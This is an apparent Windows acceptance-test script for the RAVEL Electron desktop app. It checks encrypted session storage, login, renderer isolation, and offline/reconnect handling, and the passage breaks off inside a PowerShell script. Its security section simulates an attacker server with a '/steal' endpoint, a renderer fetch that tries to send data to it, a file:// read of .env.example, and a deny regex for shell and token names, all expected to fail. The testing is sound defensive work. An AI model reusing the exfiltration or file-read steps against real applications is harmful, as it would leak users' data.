#!/usr/bin/env node
/**
 * Windows acceptance driver for the RAVEL desktop shell.
 *
 * This is the one place the real Electron executable, the real Windows
 * `safeStorage` (DPAPI), a real Gateway and a real loopback TCP path meet.
 * Playwright's Electron support launches the actual `electron.exe` with the
 * built application; nothing here substitutes a browser for desktop Electron.
 *
 * The Gateway is expected to be running outside this process (in the canonical
 * Linux build container) and reachable through `--upstream-url`. Because the
 * desktop is intentionally allowed plain HTTP only on loopback, the driver
 * opens a loopback TCP proxy in front of that upstream and configures the app
 * with the proxy URL. Cutting the proxy is therefore a real transport failure,
 * which is how the offline/reconnect requirement is exercised. The proxy is a
 * forwarder, not a Gateway and not a fixture.
 *
 * Required arguments (or environment variables):
 *   --upstream-url   http://<wsl-address>:<port>   RAVEL_T14_UPSTREAM_URL
 *
 * Optional:
 *   --gateway-url    use an already-loopback Gateway and skip the proxy
 *   --username       desktop-owner
 *   --password       desktop-owner-password
 *   --evidence-dir   docs/premium/evidence/T14/windows-electron-<timestamp>
 *   --portable       path to the portable .exe for the packaged-launch phase
 *   --skip-packaged  do not fail when --portable is absent
 *
 * The report contains only booleans, projections, hashes and screenshot paths.
 * Tokens and the account password are never written or printed.
 */

"use strict";

const crypto = require("node:crypto");
const fs = require("node:fs");
const http = require("node:http");
const net = require("node:net");
const os = require("node:os");
const path = require("node:path");
const { pathToFileURL } = require("node:url");
const { createRequire } = require("node:module");
const { execFileSync, spawn } = require("node:child_process");

const REPO_ROOT = path.resolve(__dirname, "..", "..", "..", "..");
const APP_ROOT = path.join(REPO_ROOT, "apps", "desktop");
const appRequire = createRequire(path.join(APP_ROOT, "package.json"));
const electronPath = appRequire("electron");
const { _electron, chromium } = appRequire("playwright-core");

const WAIT_MS = 60000;

function parseArgs(argv) {
  const values = {};
  for (let index = 0; index < argv.length; index += 1) {
    const key = argv[index];
    if (!key.startsWith("--")) throw new Error(`unexpected argument ${key}`);
    if (key === "--skip-packaged") {
      values["skip-packaged"] = true;
      continue;
    }
    const value = argv[index + 1];
    if (value === undefined) throw new Error(`${key} needs a value`);
    values[key.slice(2)] = value;
    index += 1;
  }
  return values;
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

function sha256(data) {
  return crypto.createHash("sha256").update(data).digest("hex");
}

function redact(text) {
  return String(text)
    .replace(/eyJ[A-Za-z0-9_-]{8,}/g, "[redacted-token]")
    .replace(/(password\s*[=:]\s*)"[^"]*"/gi, '$1"[redacted]"')
    .slice(0, 500);
}

function stamp() {
  const now = new Date();
  const pad = (value) => String(value).padStart(2, "0");
  return (
    `${now.getFullYear()}${pad(now.getMonth() + 1)}${pad(now.getDate())}-` +
    `${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}`
  );
}

function freePort() {
  return new Promise((resolve, reject) => {
    const server = net.createServer();
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const port = server.address().port;
      server.close(() => resolve(port));
    });
  });
}

class LoopbackProxy {
  constructor(upstreamUrl) {
    const url = new URL(upstreamUrl);
    assert(url.protocol === "http:", "--upstream-url must be plain http");
    this.upstreamHost = url.hostname;
    this.upstreamPort = Number(url.port || "80");
    this.port = 0;
    this.server = null;
    this.sockets = new Set();
  }

  get url() {
    assert(this.port !== 0, "the proxy has not been started");
    return `http://127.0.0.1:${this.port}`;
  }

  async start() {
    if (this.server !== null) return;
    const server = net.createServer((client) => {
      this.sockets.add(client);
      client.on("close", () => this.sockets.delete(client));
      const upstream = net.connect({
        host: this.upstreamHost,
        port: this.upstreamPort,
      });
      this.sockets.add(upstream);
      upstream.on("close", () => this.sockets.delete(upstream));
      const fail = () => {
        client.destroy();
        upstream.destroy();
      };
      client.on("error", fail);
      upstream.on("error", fail);
      client.pipe(upstream);
      upstream.pipe(client);
    });
    await new Promise((resolve, reject) => {
      server.once("error", reject);
      server.listen(this.port, "127.0.0.1", () => {
        this.port = server.address().port;
        resolve();
      });
    });
    this.server = server;
  }

  async stop() {
    for (const socket of this.sockets) socket.destroy();
    this.sockets.clear();
    if (this.server === null) return;
    const server = this.server;
    this.server = null;
    await new Promise((resolve) => server.close(() => resolve()));
  }
}

class AttackerServer {
  constructor() {
    this.requests = 0;
    this.server = null;
    this.port = 0;
  }

  get url() {
    return `http://127.0.0.1:${this.port}/steal`;
  }

  async start() {
    this.server = http.createServer((request, response) => {
      this.requests += 1;
      request.resume();
      response.writeHead(200, { "content-type": "text/plain" });
      response.end("unexpected");
    });
    await new Promise((resolve, reject) => {
      this.server.once("error", reject);
      this.server.listen(0, "127.0.0.1", () => {
        this.port = this.server.address().port;
        resolve();
      });
    });
  }

  async stop() {
    if (this.server === null) return;
    const server = this.server;
    this.server = null;
    await new Promise((resolve) => server.close(() => resolve()));
  }
}

function textOf(page, selector) {
  return page.evaluate((query) => {
    const element = document.querySelector(query);
    return element === null ? null : element.textContent;
  }, selector);
}

async function waitForText(page, selector, expected, timeout = WAIT_MS) {
  await page.waitForFunction(
    (args) => {
      const element = document.querySelector(args.selector);
      return element !== null && element.textContent.includes(args.expected);
    },
    { selector, expected },
    { timeout },
  );
}

async function waitForWindowVisible(app, timeoutMs) {
  const deadline = Date.now() + timeoutMs;
  let last = false;
  while (Date.now() < deadline) {
    last = await app.evaluate(({ BrowserWindow }) => {
      const windows = BrowserWindow.getAllWindows();
      return windows.length > 0 && windows[0].isVisible();
    });
    if (last) return;
    await new Promise((resolve) => setTimeout(resolve, 200));
  }
  throw new Error(`the Electron window never became visible (last=${last})`);
}

function sessionFilePath(userData) {
  return path.join(userData, "session.dat");
}

function readEnvelope(file) {
  const raw = fs.readFileSync(file, "utf8");
  const parsed = JSON.parse(raw);
  return { raw, parsed };
}

async function refreshFingerprint(app, envelope) {
  return app.evaluate(async ({ safeStorage }, ciphertextBase64) => {
    const envelope = { ciphertext: ciphertextBase64 };
    const plaintext = safeStorage.decryptString(
      Buffer.from(envelope.ciphertext, "base64"),
    );
    const tokens = JSON.parse(plaintext);
    if (typeof tokens.refreshToken !== "string" || tokens.refreshToken === "") {
      throw new Error("the decrypted session has no refresh token");
    }
    const digest = await globalThis.crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(tokens.refreshToken),
    );
    return Array.from(new Uint8Array(digest))
      .slice(0, 8)
      .map((value) => value.toString(16).padStart(2, "0"))
      .join("");
  }, envelope.parsed.ciphertext);
}

class Runner {
  constructor(options) {
    this.options = options;
    this.evidenceDir = options.evidenceDir;
    this.shotsDir = path.join(this.evidenceDir, "screenshots");
    this.userData = fs.mkdtempSync(path.join(os.tmpdir(), "ravel-t14-electron-"));
    this.attacker = new AttackerServer();
    this.app = null;
    this.page = null;
    this.appLog = [];
    this.checks = {};
    this.screenshots = [];
  }

  log(line) {
    const text = redact(line);
    this.appLog.push(text);
    process.stdout.write(`${text}\n`);
  }

  async launch() {
    const env = {
      ...process.env,
      RAVEL_GATEWAY_URL: this.gatewayUrl,
      RAVEL_DESKTOP_USER_DATA: this.userData,
      ELECTRON_ENABLE_LOGGING: "1",
    };
    const app = await _electron.launch({
      executablePath: electronPath,
      args: [APP_ROOT],
      env,
      timeout: WAIT_MS,
    });
    app.on("console", (message) => {
      this.log(`[renderer:${message.type()}] ${message.text()}`);
    });
    const child = app.process();
    child.stdout?.on("data", (chunk) => this.log(`[electron] ${chunk}`));
    child.stderr?.on("data", (chunk) => this.log(`[electron:err] ${chunk}`));
    const page = await app.firstWindow({ timeout: WAIT_MS });
    await page.waitForLoadState("domcontentloaded", { timeout: WAIT_MS });
    await page.waitForSelector("main", { timeout: WAIT_MS });
    this.app = app;
    this.page = page;
    return { app, page };
  }

  async screenshotWith(page, name) {
    const file = path.join(this.shotsDir, `${name}.png`);
    await page.screenshot({ path: file });
    const data = fs.readFileSync(file);
    this.screenshots.push({
      name,
      ref: path.relative(REPO_ROOT, file).split(path.sep).join("/"),
      sha256: sha256(data),
      size: data.length,
    });
    return file;
  }

  async screenshot(name) {
    return this.screenshotWith(this.page, name);
  }

  async launchAndWaitForLogin() {
    const { app, page } = await this.launch();
    await page.waitForSelector("#username", { timeout: WAIT_MS });
    await waitForWindowVisible(app, WAIT_MS);
    const title = await page.title();
    const url = page.url();
    const visible = await app.evaluate(({ BrowserWindow }) => {
      const window = BrowserWindow.getAllWindows()[0];
      return window !== undefined && window.isVisible();
    });
    assert(title === "RAVEL", `window title is ${title}`);
    assert(url.startsWith("file://"), `renderer is not local: ${url}`);
    assert(visible, "the Electron window is not visible");
    return { app, page, title, url };
  }

  async run() {
    fs.mkdirSync(this.shotsDir, { recursive: true });
    this.attacker.start();

    const gatewayUrl = this.options.gatewayUrl;
    this.gatewayUrl = gatewayUrl;

    // ---- AC1: a real window, a real Gateway sign-in, a real DPAPI session.
    let { app, page, title, url } = await this.launchAndWaitForLogin();
    this.checks.window = { title, url, visible: true };

    const preferences = await app.evaluate(({ BrowserWindow }) => {
      const window = BrowserWindow.getAllWindows()[0];
      return window.webContents.getLastWebPreferences();
    });
    for (const setting of [
      "contextIsolation",
      "sandbox",
      "webSecurity",
    ]) {
      assert(preferences[setting] === true, `${setting} is ${preferences[setting]}`);
    }
    assert(preferences.nodeIntegration === false, "nodeIntegration is enabled");
    assert(preferences.webviewTag === false, "webviewTag is enabled");
    assert(
      preferences.allowRunningInsecureContent === false,
      "insecure content is allowed",
    );

    const globals = await page.evaluate(() => ({
      require: typeof window.require,
      process: typeof window.process,
      module: typeof window.module,
      Buffer: typeof window.Buffer,
      bridge: Object.keys(window.ravelDesktop ?? {}).sort(),
    }));
    assert(globals.require === "undefined", "renderer has require");
    assert(globals.process === "undefined", "renderer has process");
    assert(globals.module === "undefined", "renderer has module");
    assert(globals.Buffer === "undefined", "renderer has Buffer");
    assert(
      JSON.stringify(globals.bridge) ===
        JSON.stringify([
          "connection",
          "listProjects",
          "login",
          "logout",
          "onConnectionStatus",
          "reconnect",
          "session",
          "version",
        ]),
      `unexpected bridge surface: ${globals.bridge.join(",")}`,
    );
    this.checks.renderer = globals;

    const safeStorageInfo = await app.evaluate(({ safeStorage }) => ({
      available: safeStorage.isEncryptionAvailable(),
      platform: process.platform,
    }));
    assert(safeStorageInfo.platform === "win32", "this is not the Windows driver");
    assert(safeStorageInfo.available, "safeStorage/DPAPI is unavailable");
    this.checks.safe_storage = safeStorageInfo;

    await this.screenshot("01-login");

    // The password never leaves the form except through the named IPC channel.
    await page.fill("#username", this.options.username);
    await page.fill("#password", `${this.options.password}-wrong`);
    await page.click("button[type=submit]");
    await waitForText(page, ".error", "not correct", WAIT_MS);
    const wrongPassword = await textOf(page, ".error");
    assert(
      !fs.existsSync(sessionFilePath(this.userData)),
      "a failed sign-in wrote a session file",
    );
    this.checks.wrong_password = {
      rejected: true,
      message: wrongPassword.slice(0, 120),
      session_file_absent: true,
    };

    await page.fill("#password", this.options.password);
    await page.click("button[type=submit]");
    await page.waitForSelector(".projects .project", { timeout: WAIT_MS });
    await waitForText(page, ".status", "Connected", WAIT_MS);
    const projectText = await textOf(page, ".projects");
    assert(projectText.includes(this.options.projectTitle), "the owned project is missing");
    const session = await app.evaluate(({ BrowserWindow }) =>
      BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
        "window.ravelDesktop.session()",
      ),
    );
    assert(session.authenticated === true, "the main process is not authenticated");
    assert(
      session.user !== null &&
        session.user.username === this.options.username &&
        typeof session.user.userId === "string" &&
        session.user.userId.length > 0,
      "the projected user is wrong",
    );
    assert(session.gatewayOrigin === gatewayUrl, "the session reports another Gateway");
    this.checks.login = {
      authenticated: session.authenticated,
      project_title: this.options.projectTitle,
      project_visible: true,
      status: "Connected",
    };
    await this.screenshot("02-authenticated");

    const sessionFile = sessionFilePath(this.userData);
    assert(fs.existsSync(sessionFile), "DPAPI did not persist a session");
    const envelope = readEnvelope(sessionFile);
    assert(
      JSON.stringify(Object.keys(envelope.parsed).sort()) ===
        JSON.stringify(["ciphertext", "format", "version"]),
      "the session file has unexpected fields",
    );
    assert(envelope.parsed.format === "ravel-desktop-session", "wrong session format");
    assert(envelope.parsed.version === 1, "wrong session version");
    for (const forbidden of ["accessToken", "refreshToken", "eyJ"]) {
      assert(!envelope.raw.includes(forbidden), `session file contains ${forbidden}`);
    }
    const fingerprintBefore = await refreshFingerprint(this.app, envelope);
    this.checks.session_file = {
      envelope_keys: Object.keys(envelope.parsed).sort(),
      size: Buffer.byteLength(envelope.raw),
      contains_plaintext_token: false,
      refresh_fingerprint: fingerprintBefore,
    };

    // ---- AC2: hostile renderer, navigation, window opening and exfiltration.
    const windowsBefore = this.app.windows().length;
    const opened = await page.evaluate(() => {
      const openedWindow = window.open("https://example.com/");
      return openedWindow === null ? "null" : "object";
    });
    await page.waitForTimeout(750);
    assert(
      this.app.windows().length === windowsBefore,
      "window.open created a new window",
    );
    this.checks.security = { window_open: opened, window_count_unchanged: true };

    const urlBefore = page.url();
    await page.evaluate(() => {
      window.location.href = "https://example.com/";
    });
    await page.waitForTimeout(1000);
    assert(page.url() === urlBefore, `navigation escaped to ${page.url()}`);
    this.checks.security.navigation_blocked = true;

    const fileUrl = pathToFileURL(path.join(REPO_ROOT, ".env.example")).href;
    const fileRead = await page.evaluate(async (target) => {
      try {
        const response = await fetch(target);
        return `read:${(await response.text()).length}`;
      } catch (error) {
        return `blocked:${String(error).slice(0, 80)}`;
      }
    }, fileUrl);
    assert(fileRead.startsWith("blocked:"), `renderer read a local file: ${fileRead}`);
    this.checks.security.local_file_blocked = true;

    const suspicious = await page.evaluate(() => {
      const names = Object.keys(window.ravelDesktop ?? {});
      return names.filter((name) =>
        /shell|exec|spawn|file|read|env|token|invoke|send|require|ipc/i.test(name),
      );
    });
    assert(suspicious.length === 0, `bridge exposes ${suspicious.join(",")}`);
    const storage = await page.evaluate(() => ({
      local: localStorage.length,
      session: sessionStorage.length,
      html_has_token: /eyJ[A-Za-z0-9_-]{8,}/.test(document.documentElement.outerHTML),
    }));
    assert(storage.local === 0, "renderer localStorage is not empty");
    assert(storage.session === 0, "renderer sessionStorage is not empty");
    assert(storage.html_has_token === false, "a token-shaped value is in the DOM");
    this.checks.security.bridge_names = suspicious;
    this.checks.security.local_storage_empty = true;
    this.checks.security.no_token_in_dom = true;

    const exfil = await page.evaluate(async (target) => {
      try {
        await fetch(target, {
          method: "POST",
          body: JSON.stringify({ bridge: Object.keys(window.ravelDesktop ?? {}) }),
        });
        return "sent";
      } catch (error) {
        return `blocked:${String(error).slice(0, 80)}`;
      }
    }, this.attacker.url);
    assert(exfil.startsWith("blocked:"), `renderer reached an unconfigured origin: ${exfil}`);
    assert(this.attacker.requests === 0, "the attacker server received a request");
    this.checks.security.unconfigured_origin_blocked = true;
    this.checks.security.attacker_requests = this.attacker.requests;

    // A second window with the same preload and the same document is not the
    // main window, so main-process sender validation must refuse it.
    const hostileWindowPromise = this.app.waitForEvent("window");
    const hostileId = await this.app.evaluate(
      ({ BrowserWindow }, args) => {
        const window = new BrowserWindow({
          show: false,
          width: 900,
          height: 700,
          webPreferences: args.preferences,
        });
        window.loadURL(args.url);
        return window.id;
      },
      {
        url: page.url(),
        preferences: {
          contextIsolation: true,
          nodeIntegration: false,
          nodeIntegrationInWorker: false,
          nodeIntegrationInSubFrames: false,
          sandbox: true,
          webSecurity: true,
          allowRunningInsecureContent: false,
          webviewTag: false,
          navigateOnDragDrop: false,
          spellcheck: false,
          safeDialogs: true,
          preload: path.join(APP_ROOT, "dist", "main", "preload.cjs"),
        },
      },
    );
    const hostile = await hostileWindowPromise;
    await hostile.waitForLoadState("domcontentloaded", { timeout: WAIT_MS });
    await hostile.waitForFunction(
      () => typeof window.ravelDesktop === "object",
      null,
      { timeout: WAIT_MS },
    );
    const hostileResult = await hostile.evaluate(async () => {
      const result = { bridge: Object.keys(window.ravelDesktop ?? {}).sort() };
      try {
        await window.ravelDesktop.session();
        result.accepted = true;
      } catch (error) {
        result.accepted = false;
        result.message = String(error && error.message ? error.message : error).slice(0, 200);
      }
      return result;
    });
    assert(hostileResult.accepted === false, "a foreign renderer used the IPC bridge");
    assert(/refused/i.test(hostileResult.message), `unexpected refusal: ${hostileResult.message}`);
    const hostileOpen = await hostile.evaluate(() => {
      const openedWindow = window.open("https://example.com/");
      return openedWindow === null ? "null" : "object";
    });
    await hostile.waitForTimeout(500);
    assert(
      this.app.windows().length === windowsBefore + 1,
      "the hostile window opened another window",
    );
    await this.app.evaluate(({ BrowserWindow }, id) => {
      const window = BrowserWindow.fromId(id);
      if (window !== null && window !== undefined) window.destroy();
    }, hostileId);
    this.checks.hostile_window = {
      same_document: true,
      same_preload: true,
      bridge: hostileResult.bridge,
      ipc_refused: true,
      refusal: hostileResult.message,
      window_open: hostileOpen,
      windows_after: this.app.windows().length,
    };

    // ---- AC1 (continued): restart restores the encrypted session, and the
    // single-use refresh chain really rotated (fingerprint, not ciphertext).
    await this.app.close();
    this.app = null;
    const { app: restoredApp, page: restoredPage } = await this.launch();
    await restoredPage.waitForSelector(".projects .project", { timeout: WAIT_MS });
    await waitForText(restoredPage, ".status", "Connected", WAIT_MS);
    assert((await restoredPage.$("#username")) === null, "restart asked for a password");
    const fingerprintAfter = await refreshFingerprint(
      restoredApp,
      readEnvelope(sessionFile),
    );
    assert(
      fingerprintAfter !== fingerprintBefore,
      "the refresh token did not rotate across restart",
    );
    this.checks.restart_restore = {
      authenticated: true,
      login_form: false,
      refresh_rotated: true,
      refresh_fingerprint_before: fingerprintBefore,
      refresh_fingerprint_after: fingerprintAfter,
    };
    this.app = restoredApp;
    this.page = restoredPage;
    await this.screenshot("03-restored");

    // ---- AC3: a real transport failure, a visible offline state, reconnect.
    assert(this.options.proxy !== null, "offline evidence needs the loopback proxy");
    await this.options.proxy.stop();
    await restoredPage.click("button:has-text('Refresh')");
    await restoredPage.waitForSelector(".banner", { timeout: WAIT_MS });
    await waitForText(restoredPage, ".banner", "offline", WAIT_MS);
    await waitForText(restoredPage, ".status", "Offline", WAIT_MS);
    const offlineText = await textOf(restoredPage, ".banner");
    await restoredPage.click("button:has-text('Reconnect')");
    await restoredPage.waitForTimeout(1500);
    assert(
      (await restoredPage.$(".banner")) !== null,
      "reconnect while the transport was down cleared the offline banner",
    );
    this.checks.offline = {
      status: "Offline",
      banner: offlineText.slice(0, 160),
      reconnect_while_down_still_offline: true,
    };
    await this.screenshot("04-offline");

    await this.options.proxy.start();
    await restoredPage.click("button:has-text('Reconnect')");
    await restoredPage.waitForFunction(
      () => document.querySelector(".banner") === null,
      null,
      { timeout: WAIT_MS },
    );
    await waitForText(restoredPage, ".status", "Connected", WAIT_MS);
    assert(
      (await restoredPage.textContent(".projects")).includes(this.options.projectTitle),
      "the project list did not return after reconnect",
    );
    this.checks.reconnect = { status: "Connected", banner_cleared: true };
    await this.screenshot("05-reconnected");

    // Closing the desktop is not stopping the Gateway. The signed-in session
    // above is gone, yet the same real endpoint still answers a fresh login.
    await restoredApp.close();
    this.app = null;
    const afterClose = await httpLogin(this.gatewayUrl, this.options);
    assert(afterClose.status === 200, `the Gateway answered ${afterClose.status} after close`);
    assert(
      afterClose.keys.includes("access_token"),
      "the Gateway did not return a session to the post-close probe",
    );
    this.checks.supervisor_survives_desktop = {
      http_status: afterClose.status,
      session_issued: true,
    };

    // ---- AC1 (continued): sign out clears the encrypted session; a restart
    // after sign-out shows the login form again.
    const { app: signOutApp, page: signOutPage } = await this.launch();
    await signOutPage.waitForSelector(".projects .project", { timeout: WAIT_MS });
    await signOutPage.click("button:has-text('Sign out')");
    await signOutPage.waitForSelector("#username", { timeout: WAIT_MS });
    assert(!fs.existsSync(sessionFile), "sign out left the encrypted session file");
    this.checks.logout = { authenticated: false, session_file_absent: true };
    await this.screenshot("06-signed-out");
    await signOutApp.close();
    this.app = null;

    const { app: finalApp, page: finalPage } = await this.launch();
    await finalPage.waitForSelector("#username", { timeout: WAIT_MS });
    await finalPage.waitForTimeout(1000);
    assert((await finalPage.$(".projects")) === null, "a signed-out restart restored a session");
    this.checks.restart_after_logout = { login_form: true, session_restored: false };
    await this.screenshot("07-login-after-logout");
    await finalApp.close();
    this.app = null;

    await this.runPackagedPhase();
  }

  async runPackagedPhase() {
    if (this.options.portable === undefined || this.options.portable === null) {
      assert(
        this.options.skipPackaged,
        "no portable artifact was supplied; pass --portable or --skip-packaged",
      );
      this.checks.packaged = { executed: false, reason: "no artifact supplied" };
      return;
    }
    const portable = path.resolve(this.options.portable);
    assert(fs.existsSync(portable), `portable artifact not found: ${portable}`);
    const data = fs.readFileSync(portable);
    const evidence = {
      executed: false,
      path: path.relative(REPO_ROOT, portable).split(path.sep).join("/"),
      sha256: sha256(data),
      size: data.length,
      launch: null,
      reason: null,
    };
    this.checks.packaged = evidence;

    const userData = fs.mkdtempSync(path.join(os.tmpdir(), "ravel-t14-portable-"));
    const env = {
      ...process.env,
      RAVEL_GATEWAY_URL: this.gatewayUrl,
      RAVEL_DESKTOP_USER_DATA: userData,
    };
    const debugPort = await freePort();

    // The NSIS portable wrapper extracts the application and starts it as a
    // separate process; the wrapper does not speak Playwright's main-process
    // inspection protocol. It does forward Chromium switches, though, so the
    // packaged renderer exposes its own DevTools endpoint. That endpoint is
    // used only to drive and photograph the packaged application (its page URL
    // contains app.asar); the real top-level Windows window and process are
    // also recorded and photographed with PrintWindow.
    const child = spawn(portable, [`--remote-debugging-port=${debugPort}`], {
      env,
      detached: false,
      stdio: "ignore",
      windowsHide: false,
    });
    let browser = null;
    try {
      const window = await waitForWindowsWindow(120000);
      const cdp = await waitForCdp(debugPort, 120000);
      evidence.executed = true;
      evidence.launch = "portable-process-window-cdp";
      evidence.window_title = window.title;
      evidence.process = window.process;
      evidence.process_id = window.id;
      evidence.portable_wrapper_running = child.exitCode === null;
      evidence.cdp = {
        browser: cdp.Browser,
        protocol_version: cdp["Protocol-Version"],
      };

      browser = await chromium.connectOverCDP(`http://127.0.0.1:${debugPort}`, {
        timeout: WAIT_MS,
      });
      const pages = browser.contexts().flatMap((context) => context.pages());
      const packagedPage =
        pages.find((candidate) => candidate.url().includes("app.asar")) ?? pages[0];
      assert(packagedPage, "CDP connected but the packaged renderer page is missing");
      evidence.renderer_url = packagedPage.url();
      assert(
        evidence.renderer_url.startsWith("file://") &&
          evidence.renderer_url.includes("app.asar"),
        `the CDP page is not the packaged renderer: ${evidence.renderer_url}`,
      );
      await packagedPage.waitForLoadState("domcontentloaded", { timeout: WAIT_MS });
      await packagedPage.waitForSelector("#username", { timeout: WAIT_MS });

      const identity = await packagedPage.evaluate(() => ({
        title: document.title,
        require: typeof window.require,
        process: typeof window.process,
        module: typeof window.module,
        Buffer: typeof window.Buffer,
        bridge: Object.keys(window.ravelDesktop ?? {}).sort(),
      }));
      assert(identity.title === "RAVEL", `packaged title is ${identity.title}`);
      for (const name of ["require", "process", "module", "Buffer"]) {
        assert(identity[name] === "undefined", `the packaged renderer has ${name}`);
      }
      assert(
        JSON.stringify(identity.bridge) ===
          JSON.stringify([
            "connection",
            "listProjects",
            "login",
            "logout",
            "onConnectionStatus",
            "reconnect",
            "session",
            "version",
          ]),
        `unexpected packaged bridge: ${identity.bridge.join(",")}`,
      );
      evidence.renderer_security = identity;
      await this.screenshotWith(packagedPage, "08-packaged-login");

      // The packaged app signs in through the same real Gateway endpoint.
      assert(
        !fs.existsSync(sessionFilePath(userData)),
        "the packaged app started with a session file",
      );
      await packagedPage.fill("#username", this.options.username);
      await packagedPage.fill("#password", `${this.options.password}-wrong`);
      await packagedPage.click("button[type=submit]");
      await waitForText(packagedPage, ".error", "not correct", WAIT_MS);
      assert(
        !fs.existsSync(sessionFilePath(userData)),
        "a failed packaged sign-in wrote a session file",
      );
      evidence.wrong_password_rejected = true;

      await packagedPage.fill("#password", this.options.password);
      await packagedPage.click("button[type=submit]");
      await packagedPage.waitForSelector(".projects .project", { timeout: WAIT_MS });
      await waitForText(packagedPage, ".status", "Connected", WAIT_MS);
      const projectText = await textOf(packagedPage, ".projects");
      assert(
        projectText.includes(this.options.projectTitle),
        "the owned project is missing from the packaged build",
      );
      evidence.authenticated = true;
      evidence.project_title = this.options.projectTitle;
      evidence.project_visible = true;
      evidence.status = "Connected";
      await this.screenshotWith(packagedPage, "09-packaged-authenticated");

      const sessionFile = sessionFilePath(userData);
      assert(
        fs.existsSync(sessionFile),
        "the packaged build did not persist an encrypted session",
      );
      const envelope = readEnvelope(sessionFile);
      assert(
        JSON.stringify(Object.keys(envelope.parsed).sort()) ===
          JSON.stringify(["ciphertext", "format", "version"]),
        "the packaged session file has unexpected fields",
      );
      for (const forbidden of ["accessToken", "refreshToken", "eyJ"]) {
        assert(
          !envelope.raw.includes(forbidden),
          `the packaged session file contains ${forbidden}`,
        );
      }
      evidence.session_file = {
        envelope_keys: Object.keys(envelope.parsed).sort(),
        size: Buffer.byteLength(envelope.raw),
        contains_plaintext_token: false,
      };

      const stillOpen = windowsWindowList().filter(
        (entry) => String(entry.MainWindowTitle).includes("RAVEL"),
      );
      assert(stillOpen.length > 0, "the packaged top-level window disappeared");
      evidence.window_still_present = true;
      evidence.window_title_after_login = stillOpen[0].MainWindowTitle;

      const shot = path.join(this.shotsDir, "10-packaged-window-authenticated.png");
      try {
        captureWindowsWindow(window.handle, shot);
        const shotData = fs.readFileSync(shot);
        evidence.desktop_screenshot = {
          ref: path.relative(REPO_ROOT, shot).split(path.sep).join("/"),
          sha256: sha256(shotData),
          size: shotData.length,
        };
        this.screenshots.push({
          name: "10-packaged-window-authenticated",
          ref: evidence.desktop_screenshot.ref,
          sha256: evidence.desktop_screenshot.sha256,
          size: evidence.desktop_screenshot.size,
        });
      } catch (error) {
        evidence.screenshot_error = redact(error);
      }
    } finally {
      if (browser !== null) {
        await Promise.race([
          browser.close().catch(() => {}),
          new Promise((resolve) => setTimeout(resolve, 5000)),
        ]);
      }
      spawnSyncTree(child.pid);
      if (evidence.process_id !== undefined) spawnSyncTree(evidence.process_id);
      killPortableByName();
    }
  }

  async writeReport(error) {
    const report = {
      task: "T14",
      kind: "windows-electron-evidence",
      started_at: this.startedAt,
      completed_at: new Date().toISOString(),
      platform: process.platform,
      versions: {
        electron: appRequire("electron/package.json").version,
        playwright_core: appRequire("playwright-core/package.json").version,
        node: process.versions.node,
        windows: os.release(),
      },
      account: { username: this.options.username },
      gateway_origin: this.gatewayUrl,
      data_mode: "REAL",
      checks: this.checks,
      screenshots: this.screenshots,
      result: error === null ? "PASS" : "FAIL",
      error:
        error === null
          ? null
          : redact(error instanceof Error ? error.message : error),
    };
    fs.writeFileSync(
      path.join(this.evidenceDir, "result.json"),
      JSON.stringify(report, null, 2) + "\n",
      "utf8",
    );
    fs.writeFileSync(
      path.join(this.evidenceDir, "electron.log"),
      this.appLog.join("\n") + "\n",
      "utf8",
    );
    return report;
  }
}

function httpLogin(gatewayUrl, options) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({
      username: options.username,
      password: options.password,
    });
    const request = http.request(
      `${gatewayUrl}/v1/auth/login`,
      {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "content-length": Buffer.byteLength(body),
        },
        timeout: 15000,
      },
      (response) => {
        let data = "";
        response.setEncoding("utf8");
        response.on("data", (chunk) => {
          data += chunk;
        });
        response.on("end", () => {
          let keys = [];
          try {
            keys = Object.keys(JSON.parse(data)).sort();
          } catch {
            keys = [];
          }
          resolve({ status: response.statusCode, keys });
        });
      },
    );
    request.on("error", reject);
    request.on("timeout", () => request.destroy(new Error("login timed out")));
    request.end(body);
  });
}

function httpGetJson(url) {
  return new Promise((resolve, reject) => {
    const request = http.request(url, { method: "GET", timeout: 5000 }, (response) => {
      let data = "";
      response.setEncoding("utf8");
      response.on("data", (chunk) => {
        data += chunk;
      });
      response.on("end", () => {
        try {
          resolve(JSON.parse(data));
        } catch (error) {
          reject(error);
        }
      });
    });
    request.on("error", reject);
    request.on("timeout", () => request.destroy(new Error("request timed out")));
    request.end();
  });
}

async function waitForCdp(port, timeoutMs) {
  const deadline = Date.now() + timeoutMs;
  let last = null;
  while (Date.now() < deadline) {
    try {
      const info = await httpGetJson(`http://127.0.0.1:${port}/json/version`);
      if (typeof info.webSocketDebuggerUrl === "string") return info;
    } catch (error) {
      last = error;
    }
    await new Promise((resolve) => setTimeout(resolve, 500));
  }
  throw new Error(
    `the packaged desktop never opened a DevTools endpoint: ${redact(last)}`,
  );
}

function windowsWindowList() {
  const script =
    "Get-Process | Where-Object { $_.MainWindowTitle -ne '' } | " +
    "Select-Object Id,ProcessName,MainWindowTitle,MainWindowHandle | ConvertTo-Json -Compress";
  const output = execFileSync(
    "powershell.exe",
    ["-NoProfile", "-NonInteractive", "-Command", script],
    { encoding: "utf8", timeout: 30000 },
  ).trim();
  if (output === "") return [];
  const parsed = JSON.parse(output);
  return Array.isArray(parsed) ? parsed : [parsed];
}

async function waitForWindowsWindow(timeoutMs) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const windows = windowsWindowList().filter(
      (entry) => String(entry.MainWindowTitle).includes("RAVEL"),
    );
    if (windows.length > 0) {
      return {
        title: windows[0].MainWindowTitle,
        process: windows[0].ProcessName,
        id: Number(windows[0].Id),
        handle: Number(windows[0].MainWindowHandle),
      };
    }
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
  throw new Error("the portable desktop never showed a RAVEL window");
}

function captureWindowsWindow(handle, file) {
  const script = `
Add-Type -AssemblyName System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class RavelWin32 {
  [StructLayout(LayoutKind.Sequential)]
  public struct RECT { public int Left; public int Top; public int Right; public int Bottom; }
  [DllImport("user32.dll")]
  public static extern bool SetProcessDPIAware();
  [DllImport("user32.dll")]
  public static extern bool GetWindowRect(IntPtr hWnd, out RECT rect);
  [DllImport("user32.dll")]
